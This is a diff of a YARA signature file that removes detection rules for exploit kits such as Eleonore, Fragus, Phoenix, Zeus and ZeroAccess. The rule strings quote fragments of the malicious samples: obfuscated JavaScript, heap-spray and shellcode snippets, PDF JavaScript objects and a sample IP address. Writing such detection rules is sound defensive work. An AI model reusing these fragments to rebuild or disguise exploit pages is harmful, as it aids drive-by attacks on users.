-    $string10 = "function rewiry(yiyr,fjkhd){"
-    $string11 = " sdjd "
-
-  condition:
-    11 of them
-}
-
-rule eleonore_js2 {
-  meta:
-    author          = "Josh Berry"
-    date            = "2016-06-26"
-    description     = "Eleonore Exploit Kit Detection"
-    hash0           = "2f5ace22e886972a8dccc6aa5deb1e79"
-    sample_filetype = "js-html"
-    yaragenerator   = "https://github.com/Xen0ph0n/YaraGenerator"
-
-  strings:
-    $string0  = "var dfshk "
-    $string1  = "arrow_next_down"
-    $string2  = "return eval('yiyr.replac'"
-    $string3  = "arrow_next_over"
-    $string4  = "arrow_prev_over"
-    $string5  = "xcCSSWeekdayBlock"
-    $string6  = "xcCSSHeadBlock"
-    $string7  = "xcCSSDaySpecial"
-    $string8  = "xcCSSDay"
-    $string9  = " window[df "
-    $string10 = "day_special"
-    $string11 = "var df"
-    $string12 = "function jklsdjfk() {"
-    $string13 = " sdjd "
-    $string14 = "'e(/kljf hdfk sdf/g,fjkhd);');"
-    $string15 = "arrow_next"
-
-  condition:
-    15 of them
-}
-
-rule fragus_htm {
-  meta:
-    author          = "Josh Berry"
-    date            = "2016-06-26"
-    description     = "Fragus Exploit Kit Detection"
-    hash0           = "f76deec07a61b4276acc22beef41ea47"
-    sample_filetype = "js-html"
-    yaragenerator   = "https://github.com/Xen0ph0n/YaraGenerator"
-
-  strings:
-    $string0  = ">Hello, "
-    $string1  = "http://www.clantemplates.com"
-    $string2  = "this template was created by Bl1nk and is downloadable at <B>ClanTemplates.com<BR></B>Replace "
-    $string3  = "></TD></TR></TABLE> "
-    $string4  = "Image21"
-    $string5  = "scrollbar etc.<BR><BR>Enjoy, Bl1nk</FONT></TD></TR></TABLE><BR></CENTER></TD></TR> "
-    $string6  = "to this WarCraft Template"
-    $string7  = " document.getElementById) x"
-    $string8  = "    if (a[i].indexOf("
-    $string9  = "x.oSrc;"
-    $string10 = "x.src; x.src"
-    $string11 = "<HTML>"
-    $string12 = "FFFFFF"
-    $string13 = " CELLSPACING"
-    $string14 = "images/layoutnormal_03.gif"
-    $string15 = "<TR> <TD "
-    $string16 = " CELLPADDING"
-
-  condition:
-    16 of them
-}
-
-rule fragus_js {
-  meta:
-    author          = "Josh Berry"
-    date            = "2016-06-26"
-    description     = "Fragus Exploit Kit Detection"
-    hash0           = "f234c11b5da9a782cb1e554f520a66cf"
-    sample_filetype = "js-html"
-    yaragenerator   = "https://github.com/Xen0ph0n/YaraGenerator"
-
-  strings:
-    $string0  = "));ELI6Q3PZ"
-    $string1  = "VGhNU2pWQmMyUXhPSFI2TTNCVGVEUXpSR3huYm1aeE5UaFhXRFI0ZFhCQVMxWkRNVGh0V0hZNFZVYzBXWFJpTVRoVFpFUklaVGxG"
-    $string2  = "eFgweDNaek5YZDFkaWFtTlhZbDlmV2tGa09Va3pSMlEyT0dwSFFIQlZRblpEYzBKRWNFeGZOVmx6V0RSU1JEYzJjRlY0TVY5SFkw"
-    $string3  = "TkhXa0ZrT1haNGRFSXhRM3BrTkRoVGMxZEJSMmcyT0dwNlkzSTJYM1pCYkZnMVVqQmpWMEZIYURZNGFucGpjalpmZGtGc1dERXpT"
-    $string4  = "byKZKkpZU<<18"
-    $string5  = ");CUer0x"
-    $string6  = "bzWRebpU3yE>>16"
-    $string7  = "RUJEWlVvMGNsVTVNMEpNWDNaNGJVSkpPRUJrUlVwRVQwQlNaR2cyY0ZWSE5GbDBRVFZ5UjFnMk9HVldOWGhMYUdFelRIZG5NMWQz"
-    $string8  = "WnZSVGxuT1ZSRkwwaFZSelZGUm5GRlJFVTBLVHQ0UWxKQ1drdzBiWEJ5WkhSdVBtdG9XVWd6TVVGSGFFeDVTMlk3ZUVKU1FscE1O"
-    $string9  = "QmZjMGN4YjBCd1oyOXBURUJJZEhvMFdYcGtOamhFV1ZwU01GVlZZbXBpUUZKV1lqTXpWMDAwY0dSNlF6aE1SekZ5ZEc4ME9FeEtN"
-    $string10 = "SCpMaWXOuME("
-    $string11 = "VjJKcVkxZGlYMTlhUVdRNVNUTkhaRFk0YWpsYWJsWkRNVGh0V0hZNFZVYzBXWFJ2Tm5CVmFEUlpWVmhDT0ZWV05YaDBRa1ZTUkUw"
-    $string12 = "2;}else{Yuii37DWU"
-    $string13 = "ELI6Q3PZ"
-    $string14 = "ZUhNNVZYQlZlRFY0UUZnMk9HMVlORkpFYkRsNGMxbEpPRUJSTVY5SGNETllPRXB0YjBsaloySnhPVVZ3UkZWQVgzTllORGgwV0RS"
-    $string15 = "S05GbE1lalk0Vm1ORmVEWnpXbEpXZDBWaU5ubzJjRlkzVjFsbFgwVmlURlpuYnpCUE5HNTBhRFpaVEZrMVFYTjZObkIwWTBVNE4x"
-    $string16 = "Vm5CWFFVZG9OamhxZW1OeU5sOTJRV3hZTVROSlpEWTRVM294V1VSUFFFdFdZalE0WlVjeGNsSmtObmhBYURVNFZVZEFjRlZDZGtO"
-    $string17 = "Yuii37DWU<<12"
-    $string18 = ";while(hdnR9eo3pZ6E3<ZZeD3LjJQ.length){eMImGB"
-
-  condition:
-    18 of them
-}
-
-rule fragus_js2 {
-  meta:
-    author          = "Josh Berry"
-    date            = "2016-06-26"
-    description     = "Fragus Exploit Kit Detection"
-    hash0           = "f234c11b5da9a782cb1e554f520a66cf"
-    sample_filetype = "js-html"
-    yaragenerator   = "https://github.com/Xen0ph0n/YaraGenerator"
-
-  strings:
-    $string0  = "(ELI6Q3PZ"
-    $string1  = "SnJTbVJqV2tOa09VbGZSMHcwY0ZWZmRrRjBjRFY0Y3psVmNGVjROWGhBV0RZNGJWZzBVa1J4TjNCVlgwVmlhRjkyZURaS1NWOUhj"
-    $string2  = "eFgweDNaek5YZDFkaWFtTlhZbDlmV2tGa09Va3pSMlEyT0dwSFFIQlZRblpEYzBKRWNFeGZOVmx6V0RSU1JEYzJjRlY0TVY5SFkw"
-    $string3  = "VUpKUVdWS05ISlZjMXBTTUdWRlNFQmpaMjlrVDBCTFYzY3pZbGRpZG5oeldFUndkSE16YjB4M2JXSnFZMWRpZVY4ellreDNaMko1"
-    $string4  = "((Yuii37DWU"
-    $string5  = "YURVNFZXUlhjRlZDZGxsQVJ6UlNaRTlBUzFkM00ySlhiekU0ZEhnMWNrUjZZM0kyWDNaQmJGZ3hNMGxrTmpoVGVqRlpkSEUyV1dW"
-    $string6  = "String.fromCharCode(ZZeD3LjJQ);}else if(QIyZsvvbEmVOpp"
-    $string7  = "1);ELI6Q3PZ"
-    $string8  = "));Yuii37DWU"
-    $string9  = ");CUer0x"
-    $string10 = "T1ZaQ05IUkRTVGhqT1VWd1ZWOUpRMlZLZG5oNlQwQkxWM2N6WWxkQmRrRkFPVmR3VlRsYWJsWnNOWGhKT1ZkeFZWazFRbEU1UlZK"
-    $string11 = "TlpkM2wxS3lzcExUUTRYU2s4UEhocFVqRk9jazA3SUdsbUtIaHBVakZPY2swcGV5QkdWek5NVnlzOVVrSklWVE0wVDJ0NlpTZzJP"
-    $string12 = "String.fromCharCode(((eMImGB"
-    $string13 = "RGRDUkV0WFV6VkJkRkV4WHpCalYwRkhhRFk0YW5wamNqWmZka0ZzV0RaSWExZzBXWEZDUlZsQVpEWkJOMEoyZUhwd1duSlRXVE5J"
-    $string14 = "SCpMaWXOuME(mi1mm8bu87rL0W);eval(Pcii3iVk1AG);</script></body></html>"
-    $string15 = "Yuii37DWU"
-    $string16 = "Yuii37DWU<<12"
-    $string17 = "eTVzWlc1bmRHZ3NJRWhWUnpWRlJuRkZSRVUwUFRFd01qUXNJR2hQVlZsRVJFVmxVaXdnZUVKU1FscE1ORzF3Y21SMGJpd2dSbGN6"
-
-  condition:
-    17 of them
-}
-
-rule fragus_js_flash {
-  meta:
-    author          = "Josh Berry"
-    date            = "2016-06-26"
-    description     = "Fragus Exploit Kit Detection"
-    hash0           = "377431417b34de8592afecaea9aab95d"
-    sample_filetype = "js-html"
-    yaragenerator   = "https://github.com/Xen0ph0n/YaraGenerator"
-
-  strings:
-    $string0  = "document.appendChild(bdy);try{for (i"
-    $string1  = "0; i<10; i"
-    $string2  = "default"
-    $string3  = "var m "
-    $string4  = "/g, document.getElementById('divid').innerHTML));"
-    $string5  = " n.substring(0,r/2);"
-    $string6  = "document.getElementById('f').innerHTML"
-    $string7  = "'atk' onclick"
-    $string8  = "function MAKEHEAP()"
-    $string9  = "document.createElement('div');"
-    $string10 = "<button id"
-    $string11 = "/g, document.getElementById('divid').innerHTML);"
-    $string12 = "document.body.appendChild(gg);"
-    $string13 = "var bdy "
-    $string14 = "var gg"
-    $string15 = " unescape(gg);while(n.length<r/2) { n"
-
-  condition:
-    15 of them
-}
-
-rule fragus_js_vml {
-  meta:
-    author          = "Josh Berry"
-    date            = "2016-06-26"
-    description     = "Fragus Exploit Kit Detection"
-    hash0           = "8ab72337c815e0505fcfbc97686c3562"
-    sample_filetype = "js-html"
-    yaragenerator   = "https://github.com/Xen0ph0n/YaraGenerator"
-
-  strings:
-    $string0  = " 0x100000;"
-    $string1  = "            var gg "
-    $string2  = "/g, document.getElementById('divid').innerHTML));"
-    $string3  = "                                var sss "
-    //$string4 = "                }"
-    $string5  = "                        document.body.appendChild(obj);"
-    $string6  = "                                var hbs "
-    $string7  = " shcode; }"
-    $string8  = " '<div id"
-    $string9  = " hbs - (shcode.length"
-    $string10 = "){ m[i] "
-    $string11 = " unescape(gg);"
-    $string12 = "                                var z "
-    $string13 = "                                var hb "
-    $string14 = " Math.ceil('0'"
-
-  condition:
-    14 of them
-}
-
 rule XDP_embedded_PDF: PDF {
   meta:
     author  = "Glenn Edwards (@hiddenillusion)"
@@ -9103,573 +8289,12 @@ rule FlashNewfunction: decodedPDF {
     ($unescape and $shellcode and $cve20101297) or ($shellcode5 and $cve20101297)
 }
 
-rule phoenix_html {
-  meta:
-    author          = "Josh Berry"
-    date            = "2016-06-26"
-    description     = "Phoenix Exploit Kit Detection"
-    hash0           = "8395f08f1371eb7b2a2e131b92037f9a"
-    sample_filetype = "js-html"
-    yaragenerator   = "https://github.com/Xen0ph0n/YaraGenerator"
-
-  strings:
-    $string1  = "'></applet><body id"
-    $string2  = "<applet mayscript"
-    $string3  = "/gmi,String.fromCharCode(2"
-    $string4  = "/gmi,' ').replace(/"
-    $string5  = "pe;i;;.j1s->c"
-    $string6  = "es4Det"
-    $string7  = "<textarea>function"
-    $string8  = ".replace(/"
-    $string9  = ".jar' code"
-    $string10 = ";iFc;ft'b)h{s"
-
-  condition:
-    10 of them
-}
-
-rule phoenix_html10 {
-  meta:
-    author          = "Josh Berry"
-    date            = "2016-06-26"
-    description     = "Phoenix Exploit Kit Detection"
-    hash0           = "f5f8dceca74a50076070f2593e82ec43"
-    sample_filetype = "js-html"
-    yaragenerator   = "https://github.com/Xen0ph0n/YaraGenerator"
-
-  strings:
-    $string0  = "pae>crAeahoilL"
-    $string1  = "D11C0002C0069733E60656F6462070D000402DFF200696E"
-    $string2  = "nbte)bbn"
-    $string3  = "v9o16,0')0B80002328203;)82F00223A216ifA160A262A462(a"
-    $string4  = "0442DFD2E30EC80E42D2E00AC3F3D53C9CAEBFF7E1E805080B044057CB1C0EF7F263DC64E0CBE47C2A21E370EE4A"
-    $string5  = ";)npeits0e.uvr;][tvr"
-    $string6  = "433EBE90242003E00C606D04036563435805000102000v020E656wa.i118,0',9F902F282620''C62022646660}{A780232A"
-    $string7  = "350;var ysjzyq"
-    $string8  = "aSmd'lm/t/im.}d.-Ljg,l-"
-    $string9  = "0017687F6164706E6967060002008101'2176045ckb"
-    $string10 = "63(dcma)nenn869"
-    $string11 = "').replace(/"
-    $string12 = "xd'c0lrls09sare"
-    $string13 = "(]t.(7u(<p"
-    $string14 = "d{et;bdBcriYtc:eayF20'F62;23C4AABA3B84FE21C2B0B066C0038B8353AF5C0B4DF8FF43E85FB6F05CEC4080236F3CDE6E"
-    $string15 = "/var another;</textarea>"
-    $string16 = "Fa527496C62eShHmar(bA,pPec"
-    $string17 = "FaA244A676C,150e62A5B2B61,'2F"
-
-  condition:
-    17 of them
-}
-
-rule phoenix_html11 {
-  meta:
-    author          = "Josh Berry"
-    date            = "2016-06-26"
-    description     = "Phoenix Exploit Kit Detection"
-    hash0           = "be8c81288f9650e205ed13f3167ce256"
-    sample_filetype = "js-html"
-    yaragenerator   = "https://github.com/Xen0ph0n/YaraGenerator"
-
-  strings:
-    $string0  = "D'0009F0C6941617C43427A76080001000F47020C606volv99,0,6,"
-    $string1  = "';)nWd"
-    $string2  = "IW'eeCn)s.a9e;0CF300FF379011078E047873754163636960496270486264416455747D69737812060209011301010104D0"
-    $string3  = "D8D51F5100019006D60667F2E056940170E01010747"
-    $string4  = "515F2F436WemBh2A4560683aFanoi(utse.o1/f;pistelzi"
-    $string5  = "/p(e/oah)FHw'aaarDsnwi-"
-    $string6  = "COa506u%db10u%1057u%f850u%f500u%0683u%05a8u%0030u%0706u%d300u%585du%38d0u%0080u%5612u'u%A2DdF6u%1M:."
-    $string7  = "S(yt)Dj"
-    $string8  = "FaA26285325,150e8292A6968,'2F"
-    $string9  = "0200e{b<0:D>r5d4u%c005u%0028u%251eu%a095u%6028u%0028u%2500u%f7f7u%70d7u%2025u%9008u%08f8u%c607usu%37"
-    $string10 = "(mEtlltopo{{e"
-    $string11 = "aSmd'lm/t/im.}d.-Ljg,l-"
-    $string12 = "r)C4snfapfuo}"
-    $string13 = "').replace(/"
-    $string14 = "A282A5ifA160F2628206(a"
-    $string15 = "obn0cf"
-    $string16 = "d(i'C)rtr.'pvif)iv1ilW)S((Ltl.)2,0,9;0se"
-    $string17 = "E23s3003476B18703C179396D08B841BC554F11678F0FEB9505FB355E044F33A540F61743738327E32D97D070FA37D87s000"
-    $string18 = "603742E545904575'294E20680,6F902E292A60''E6202A4E6468},e))tep"
-
-  condition:
-    18 of them
-}
-
-rule phoenix_html3 {
-  meta:
-    author          = "Josh Berry"
-    date            = "2016-06-26"
-    description     = "Phoenix Exploit Kit Detection"
-    hash0           = "d7cacbff6438d866998fc8bfee18102d"
-    sample_filetype = "js-html"
-    yaragenerator   = "https://github.com/Xen0ph0n/YaraGenerator"
-
-  strings:
-    $string0  = "mtfla/,)asaf)'}"
-    $string1  = "72267E7C'A3035CFC415DFAAA834B208D8C230FD303E2EFFE386BE05960C588C6E85650746E690C39F706F97DC74349BA134"
-    $string2  = "N'eiui7F6e617e00F145A002645E527BFF264842F877B2FFC1FE84BCC6A50F0305B5B0C36A019F53674FD4D3736C494BD5C2"
-    $string3  = "lndl}})<>"
-    $string4  = "otodc};b<0:D>r5d4u%c005u%0028u%251eu%a095u%6028u%0028u%2500u%f7f7u%70d7u%2025u%9008u%08f8u%c607usu%3"
-    $string5  = "tuJaboaopb"
-    $string6  = "a(vxf{p'tSowa.i,1NIWm("
-    $string7  = "2004et"
-    $string8  = "2054sttE5356496478"
-    $string9  = "yi%A%%A%%A%%A%Cvld3,5314,004,6211,931,,,011394617,983,1154,5,1,,1,1,13,08,4304,1"
-    $string10 = "0ovel04ervEeieeem)h))B(ihsAE;u%04b8u%1c08u%0e50u%a000u%1010u%4000u%20afu%0006u%2478u%0020u%1065u%210"
-    $string11 = "/gmi,String.fromCharCode(2"
-    $string12 = "ncBcaocta.ye"
-    $string13 = "0201010030004A033102090;na"
-    $string14 = "66u%0(ec'h{iis%%A%%A%%A%%A%frS1,,8187,1,4,11,91516,,61,,10841,1,13,,,11248,01818849,23,,,,791meits0e"
-    $string15 = "D11C0002C0069733E60656F6462070D000402DFF200696E"
-    $string16 = "810p0y98"
-    $string17 = "9,0,e'Fm692E583760"
-    $string18 = "57784234633a)(u"
-
-  condition:
-    18 of them
-}
-
-rule phoenix_html5 {
-  meta:
-    author          = "Josh Berry"
-    date            = "2016-06-26"
-    description     = "Phoenix Exploit Kit Detection"
-    hash0           = "30afdca94d301905819e00a7458f4a4e"
-    sample_filetype = "js-html"
-    yaragenerator   = "https://github.com/Xen0ph0n/YaraGenerator"
-
-  strings:
-    $string0  = "dtesu}"
-    $string1  = "<textarea>function gvgsxoy(gwcqg1){return gwcqg1.replace(/"
-    $string2  = "v}Ahnhxwet"
-    $string3  = "0125C6BBA2B84F7A1D2940C04C8B7449A40EEB0D14C8003535C0042D75E05F0D7F3E0A7B4E33EB4D8D47119290FC"
-    $string4  = "a2Fs2325223869e'Fm2873367130"
-    $string5  = "m0000F0F6E66607C71646F6607000107FA61021F6060(aeWWIN"
-    $string6  = ")(r>hd1/dNasmd(fpas"
-    $string7  = "9,0,e'Fm692E583760"
-    $string8  = "5ud(dis"
-    $string9  = "nacmambuntcmi"
-    $string10 = "Fa078597467,1C0e674366871,'2F"
-    $string11 = "Fa56F386A76,180e828592024,'2F"
-    $string12 = "alA)(2avoyOi;ic)t6])teptp,an}tnv0i'fms<uic"
-    $string13 = "iR'nandee"
-    $string14 = "('0.aEa-9leal"
-    $string15 = "bsD0seF"
-    $string16 = "t.ck263/6F3a001CE7A2684067F98BEC18B738801EF1F7F7E49A088695050C000865FC38080FE23727E0E8DE9CB53E748472"
-
-  condition:
-    16 of them
-}
-
-rule phoenix_html6 {
-  meta:
-    author          = "Josh Berry"
-    date            = "2016-06-26"
-    description     = "Phoenix Exploit Kit Detection"
-    hash0           = "4aabb710cf04240d26c13dd2b0ccd6cc"
-    sample_filetype = "js-html"
-    yaragenerator   = "https://github.com/Xen0ph0n/YaraGenerator"
-
-  strings:
-    $string0  = "F4B6B2E67)A780A373A633;ast2316363677fa'es6F3635244"
-    $string1  = "piia.a}rneecc.cnuoir"
-    $string2  = "0448D5A54BE10A5DA628100AC3F3D53C9CAEBFF7E1E805080B044057CB1C0EF7F263DC64E0CBE47C2A21E55E9EA620000106"
-    $string3  = "],enEn..o"
-    $string4  = "o;1()sna"
-    $string5  = "(eres(0.,"
-    $string6  = "}fs2he}o.t"
-    $string7  = "f'u>jisch3;)Ie)C'eO"
-    $string8  = "refhiacei"
-    $string9  = "0026632528(sCE7A2684067F98BEC1s00000F512Fm286631666"
-    $string10 = "vev%80b4u%ee18u%28b8u%2617u%5c08u%0e50u%a000u%9006u%76efu%b1cbu%ba2fu%6850u%0524u%9720u%f70<}1msa950"
-    $string11 = "pdu,xziien,ie"
-    $string12 = "rr)l;.)vr.nbl"
-    $string13 = "ii)ruccs)1e"
-    $string14 = "F30476737930anD<tAhnhxwet"
-    $string15 = ")yf{(ee..erneef"
-    $string16 = "ieiiXuMkCSwetEet"
-    $string17 = "F308477E7A7itme"
-
-  condition:
-    17 of them
-}
-
-rule phoenix_html7 {
-  meta:
-    author          = "Josh Berry"
-    date            = "2016-06-26"
-    description     = "Phoenix Exploit Kit Detection"
-    hash0           = "f0e1b391ec3ce515fd617648bec11681"
-    sample_filetype = "js-html"
-    yaragenerator   = "https://github.com/Xen0ph0n/YaraGenerator"
-
-  strings:
-    $string0  = "EBF0a0001B05D266503046C7A491A0C00044F0002035D0D0twl''WIN"
-    $string1  = "ah80672528657"
-    $string2  = "n);tctt)Eltc(Dj"
-    $string3  = ";cnt2<tEf"
-    $string4  = "iwkne){bvfvgzg5"
-    $string5  = "..'an{ea-Ect'8-huJ.)/l'/tCaaa}<Ct95l"
-    $string6  = "'WIWhaFtF662F6577IseFe427347637"
-    $string7  = "ddTh75e{"
-    $string8  = "Ae'n,,9"
-    $string9  = "%E7E3Vemtyi"
-    $string10 = "cf'treran"
-    $string11 = "ncBcaocta.ye"
-    $string12 = ")'0,p8k"
-    $string13 = "0;{tc4F}c;eptdpduoCuuedPl80evD"
-    $string14 = "iq,q,Nd(nccfr'Bearc'nBtpw"
-    $string15 = ";)npeits0e.uvhF$I'"
-    $string16 = "nvasai0.-"
-    $string17 = "lmzv'is'"
-
-  condition:
-    17 of them
-}
-
-rule phoenix_html8 {
-  meta:
-    author          = "Josh Berry"
-    date            = "2016-06-26"
-    description     = "Phoenix Exploit Kit Detection"
-    hash0           = "1c19a863fc4f8b13c0c7eb5e231bc3d1"
-    sample_filetype = "js-html"
-    yaragenerator   = "https://github.com/Xen0ph0n/YaraGenerator"
-
-  strings:
-    $string0  = "0x5)).replace(/"
-    $string1  = "%A%%A%%nc(,145,9,84037,1711,,4121,56,1,,0505,,651,,3,514101,01,29,7868,90"
-    $string2  = "/gmi,String.fromCharCode(2"
-    $string3  = "turt;oo)s"
-    $string4  = "91;var jtdpar"
-    $string5  = "R(,13,7,63,48140601,5057,,319,,6,1,1,2,,110,0,1011171,2319,,,,10vEAs)tfmneyeh%A%%A%%A%%A%s<u91,4693,"
-    $string6  = "y%%A%%A%%A%%A.meo21117,7,1,,10,1,9,8,1,9,100,6,141003,74181,163,441114,43,207,,remc'ut"
-    $string7  = "epjtjqe){jtdpar"
-    $string8  = "/gmi,'"
-    $string9  = "<font></font><body id"
-    $string10 = " epjtjqe; fqczi > 0; fqczi--){for (bwjmgl7 "
-    $string11 = "nbte)bb(egs%A%%A%%A%%A%%m"
-    $string12 = "fvC9614165,,,1,1801151030,,0,,487641114,,1,141,914810036,,888,201te.)'etdc:ysaA%%A%%A%%A%%5sao,61,0,"
-    $string13 = "(tiAmrd{/tnA%%A%%A%%A%%Aiin11,,1637,34191,626958314,11007,,61145,411,7,9,1821,,43,8311,26;d'ebt.dyvs"
-    $string14 = "A%%A%%A%%Ao"
-    $string15 = "hrksywd(cpkwisk4);/"
-    $string16 = ";</script>"
-
-  condition:
-    16 of them
-}
-
-rule phoenix_html9 {
-  meta:
-    author          = "Josh Berry"
-    date            = "2016-06-26"
-    description     = "Phoenix Exploit Kit Detection"
-    hash0           = "742d012b9df0c27ed6ccf3b234db20db"
-    sample_filetype = "js-html"
-    yaragenerator   = "https://github.com/Xen0ph0n/YaraGenerator"
-
-  strings:
-    $string0  = "tute)bbr:"
-    $string1  = "nfho(tghRx"
-    $string2  = "()irfE/Rt..cOcC"
-    $string3  = "NcEnevbf"
-    $string4  = "63FB8B4296BBC290A0.'0000079'Fh20216B6A6arA;<"
-    $string5  = "wHe(cLnyeyet(a.i,r.{.."
-    $string6  = "tute)bbdfiiix'bcr"
-    $string7  = "itifdf)d1L2f'asau%d004u%8e00u%0419u%a58du%2093u%ec10u%0050u%00d4u%4622u%bcd1u%b1ceu%5000u%f7f5u%5606"
-    $string8  = "2F4693529783'82F076676C38'te"
-    $string9  = "sm(teoeoi)cfh))pihnipeeeo}.,(.(("
-    $string10 = "ao)ntavlll{))ynlcoix}hiN.il'tes1ad)bm;"
-    $string11 = "i)}m0f(eClei(/te"
-    $string12 = "}aetsc"
-    $string13 = "irefnig.pT"
-    $string14 = "a0mrIif/tbne,(wsk,"
-    $string15 = "500F14B06000000630E6B72636F60632C6E711C6E762E646F147F44767F650A0804061901020009006B120005A2006L"
-    $string16 = ".hB.Csf)ddeSs"
-    $string17 = "tnne,IPd4Le"
-    $string18 = "hMdarc'nBtpw"
-
-  condition:
-    18 of them
-}
-
-rule phoenix_pdf {
-  meta:
-    author          = "Josh Berry"
-    date            = "2016-06-26"
-    description     = "Phoenix Exploit Kit Detection"
-    hash0           = "16de68e66cab08d642a669bf377368da"
-    hash1           = "bab281fe0cf3a16a396550b15d9167d5"
-    sample_filetype = "pdf"
-    yaragenerator   = "https://github.com/Xen0ph0n/YaraGenerator"
-
-  strings:
-    $string0  = "0000000254 00000 n"
-    $string1  = "0000000295 00000 n"
-    $string2  = "trailer<</Root 1 0 R /Size 7>>"
-    $string3  = "0000000000 65535 f"
-    $string4  = "3 0 obj<</JavaScript 5 0 R >>endobj"
-    $string5  = "0000000120 00000 n"
-    $string6  = "%PDF-1.0"
-    $string7  = "startxref"
-    $string8  = "0000000068 00000 n"
-    $string9  = "endobjxref"
-    $string10 = ")6 0 R ]>>endobj"
-    $string11 = "0000000010 00000 n"
-
-  condition:
-    11 of them
-}
-
-rule phoenix_pdf2 {
-  meta:
-    author          = "Josh Berry"
-    date            = "2016-06-26"
-    description     = "Phoenix Exploit Kit Detection"
-    hash0           = "33cb6c67f58609aa853e80f718ab106a"
-    sample_filetype = "pdf"
-    yaragenerator   = "https://github.com/Xen0ph0n/YaraGenerator"
-
-  strings:
-    $string0  = "\\nQb<%"
-    $string1  = "0000000254 00000 n"
-    $string2  = ":S3>v0$EF"
-    $string3  = "trailer<</Root 1 0 R /Size 7>>"
-    $string4  = "%PDF-1.0"
-    $string5  = "0000000000 65535 f"
-    $string6  = "endstream"
-    $string7  = "0000000010 00000 n"
-    $string8  = "6 0 obj<</JS 7 0 R/S/JavaScript>>endobj"
-    $string9  = "3 0 obj<</JavaScript 5 0 R >>endobj"
-    $string10 = "}pr2IE"
-    $string11 = "0000000157 00000 n"
-    $string12 = "1 0 obj<</Type/Catalog/Pages 2 0 R /Names 3 0 R >>endobj"
-    $string13 = "5 0 obj<</Names[("
-
-  condition:
-    13 of them
-}
-
-rule phoenix_pdf3 {
-  meta:
-    author          = "Josh Berry"
-    date            = "2016-06-26"
-    description     = "Phoenix Exploit Kit Detection"
-    hash0           = "bab281fe0cf3a16a396550b15d9167d5"
-    sample_filetype = "pdf"
-    yaragenerator   = "https://github.com/Xen0ph0n/YaraGenerator"
-
-  strings:
-    $string0  = "trailer<</Root 1 0 R /Size 7>>"
-    $string1  = "stream"
-    $string2  = ";_oI5z"
-    $string3  = "0000000010 00000 n"
-    $string4  = "3 0 obj<</JavaScript 5 0 R >>endobj"
-    $string5  = "7 0 obj<</Filter[ /FlateDecode /ASCIIHexDecode /ASCII85Decode ]/Length 3324>>"
-    $string6  = "endobjxref"
-    $string7  = "L%}gE("
-    $string8  = "0000000157 00000 n"
-    $string9  = "1 0 obj<</Type/Catalog/Pages 2 0 R /Names 3 0 R >>endobj"
-    $string10 = "0000000120 00000 n"
-    $string11 = "4 0 obj<</Type/Page/Parent 2 0 R /Contents 12 0 R>>endobj"
-
-  condition:
-    11 of them
-}
-
 rule redkit_bin_basic: exploit_kit {
   strings:
     $str1 = /\/\d{2}.html\s/
 
   condition:
     $str1
-}
-
-rule zeus_js {
-  meta:
-    author          = "Josh Berry"
-    date            = "2016-06-26"
-    description     = "Zeus Exploit Kit Detection"
-    hash0           = "c87ac7a25168df49a64564afb04dc961"
-    sample_filetype = "js-html"
-    yaragenerator   = "https://github.com/Xen0ph0n/YaraGenerator"
-
-  strings:
-    $string0  = "var jsmLastMenu "
-    $string1  = "position:absolute; z-index:99' "
-    $string2  = " -1)jsmSetDisplayStyle('popupmenu' "
-    $string3  = " '<tr><td><a href"
-    $string4  = "  jsmLastMenu "
-    $string5  = "  var ids "
-    $string6  = "this.target"
-    $string7  = " jsmPrevMenu, 'none');"
-    $string8  = "  if(jsmPrevMenu "
-    $string9  = ")if(MenuData[i])"
-    $string10 = " '<div style"
-    $string11 = "popupmenu"
-    $string12 = "  jsmSetDisplayStyle('popupmenu' "
-    $string13 = "function jsmHideLastMenu()"
-    $string14 = " MenuData.length; i"
-
-  condition:
-    14 of them
-}
-
-rule zeroaccess_css2 {
-  meta:
-    author          = "Josh Berry"
-    date            = "2016-06-27"
-    description     = "ZeroAccess Exploit Kit Detection"
-    hash0           = "e300d6a36b9bfc3389f64021e78b1503"
-    sample_filetype = "js-html"
-    yaragenerator   = "https://github.com/Xen0ph0n/YaraGenerator"
-
-  strings:
-    $string0  = "er div.panel-hide{display:block;position:absolute;z-index:200;margin-top:-1.5em;}div.panel-pane div."
-    $string1  = "ve.gif) right center no-repeat;}div.ctools-ajaxing{float:left;width:18px;background:url(http://cdn3."
-    $string2  = "cdn2.dailyrx.com"
-    $string3  = "efefef;margin:5px 0 5px 0;}"
-    $string4  = "node{margin:0;padding:0;}div.panel-pane div.feed a{float:right;}"
-    $string5  = ":0 5px 0 0;float:left;}div.tweets-pulled-listing div.tweet-authorphoto img{max-height:40px;max-width"
-    $string6  = "i a{color:"
-    $string7  = ":bold;}div.tweets-pulled-listing .tweet-time a{color:silver;}div.tweets-pulled-listing  div.tweet-di"
-    $string8  = "div.panel-pane div.admin-links{font-size:xx-small;margin-right:1em;}div.panel-pane div.admin-links l"
-    $string9  = "div.tweets-pulled-listing ul{list-style:none;}div.tweets-pulled-listing div.tweet-authorphoto{margin"
-    $string10 = "FFFFDD none repeat scroll 0 0;border:1px solid "
-    $string11 = "vider{clear:left;border-bottom:1px solid "
-
-  condition:
-    11 of them
-}
-
-rule zeroaccess_htm {
-  meta:
-    author          = "Josh Berry"
-    date            = "2016-06-27"
-    description     = "ZeroAccess Exploit Kit Detection"
-    hash0           = "0e7d72749b60c8f05d4ff40da7e0e937"
-    sample_filetype = "js-html"
-    yaragenerator   = "https://github.com/Xen0ph0n/YaraGenerator"
-
-  strings:
-    $string0  = "screen.height:"
-    $string1  = "</script></head><body onload"
-    $string2  = "Fx0ZAQRKXUVgbh0qNDRJVxYwGg4tGh8aHQoAVQQSNyo0NElXFjAaDi0NFQYESl1FBBNnTFoSPiBmADwnPTQxPSdKWUUEE2UcGR0z"
-    $string3  = "0);-10<b"
-    $string4  = "function fl(){var a"
-    $string5  = "0);else if(navigator.mimeTypes"
-    $string6  = ");b.href"
-    $string7  = "/presults.jsp"
-    $string8  = "128.164.107.221"
-    $string9  = ")[0].clientWidth"
-    $string10 = "presults.jsp"
-    $string11 = ":escape(c),e"
-    $string12 = "navigator.plugins.length)navigator.plugins["
-    $string13 = "window;d"
-    $string14 = "gr(),j"
-    $string15 = "VIEWPORT"
-    $string16 = "FQV2D0ZAH1VGDxgZVg9COwYCAwkcTzAcBxscBFoKAAMHUFVuWF5EVVYVdVtUR18bA1QdAU8HQjgeUFYeAEZ4SBEcEk1FTxsdUlVA"
-
-  condition:
-    16 of them
-}
-
-rule zeroaccess_js {
-  meta:
-    author          = "Josh Berry"
-    date            = "2016-06-27"
-    description     = "ZeroAccess Exploit Kit Detection"
-    hash0           = "a9f30483a197cfdc65b4a70b8eb738ab"
